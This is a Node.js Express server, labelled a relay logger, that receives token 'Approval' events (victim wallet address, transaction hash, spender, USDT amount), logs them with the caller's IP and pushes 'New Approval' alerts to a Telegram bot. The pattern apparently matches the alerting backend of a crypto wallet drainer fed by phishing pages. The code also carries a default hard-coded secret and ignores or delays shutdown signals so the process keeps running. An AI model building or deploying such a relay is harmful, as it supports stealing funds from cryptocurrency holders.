const express = require('express')
const cors = require('cors')
const app = express()

app.use(cors())
app.use(express.json())

// ─── Config ───────────────────────────────────────
const API_SECRET = process.env.API_SECRET || 'default-secret-change-me'
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

let lastTelegramSent = 0

// ─── Telegram helper ──────────────────────────────
async function sendTelegram(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('Telegram not configured, skipping')
    return false
  }

  try {
    const res = await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        disable_web_page_preview: true
      })
    })
    if (!res.ok) throw new Error('HTTP ' + res.status)
    console.log('Telegram sent:', text.slice(0, 50))
    return true
  } catch (err) {
    console.error('Telegram failed:', err.message)
    return false
  }
}

// ─── Main endpoint ────────────────────────────────
app.post('/web/relay', async (req, res) => {
  console.log('Received request:', req.body)

  if (req.headers['x-api-secret'] !== API_SECRET) {
    console.log('Auth failed')
    return res.status(401).json({ error: 'Unauthorized' })
  }

  const { chain, address, txHash, spender, token, amount } = req.body

  if (!address || !txHash) {
    return res.status(400).json({ error: 'Missing address or txHash' })
  }

  const logEntry = {
    time: new Date().toISOString(),
    ip: req.ip,
    chain,
    address,
    txHash,
    spender,
    token,
    amount
  }
  console.log(JSON.stringify(logEntry))

  const text = 'New Approval\n\n' +
    'Address: ' + address + '\n' +
    'Amount: ' + (amount || '?') + ' USDT\n' +
    'Tx Hash: ' + txHash + '\n' +
    'Spender: ' + (spender || 'N/A') + '\n' +
    'Chain: ' + chain + '\n' +
    'Time: ' + new Date().toISOString()

  await sendTelegram(text)

  res.status(200).json({ ok: true })
})

// ─── Health checks ────────────────────────────────
app.get('/', (req, res) => res.send('Relay logger alive'))
app.get('/health', (req, res) => res.status(200).json({ status: 'ok', time: new Date().toISOString() }))

// ─── Keep-alive heartbeat ─────────────────────────
setInterval(() => {
  console.log('Heartbeat:', new Date().toISOString())
}, 10000)

// ─── Start server ─────────────────────────────────
const PORT = process.env.PORT || 3000
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log('Logger running on port ' + PORT)
  console.log('Telegram bot:', TELEGRAM_BOT_TOKEN ? 'configured' : 'MISSING')
  console.log('Telegram chat:', TELEGRAM_CHAT_ID ? 'configured' : 'MISSING')
  
  // Send startup message AFTER server is listening
  sendTelegram('🟢 Relay logger started on port ' + PORT)
})

// ─── Force process to stay alive ──────────────────
// Prevent SIGTERM from killing immediately
process.on('SIGTERM', () => {
  console.log('SIGTERM received, keeping alive for 30s')
  setTimeout(() => {
    server.close(() => {
      console.log('Server closed')
      process.exit(0)
    })
  }, 30000)
})

process.on('SIGINT', () => {
  console.log('SIGINT received, keeping alive')
  // Don't exit
})

// Keep event loop alive
setInterval(() => {}, 1000)

// Prevent unhandled errors from crashing
process.on('uncaughtException', (err) => {
  console.error('Uncaught:', err)
})

process.on('unhandledRejection', (err) => {
  console.error('Unhandled:', err)
})
    
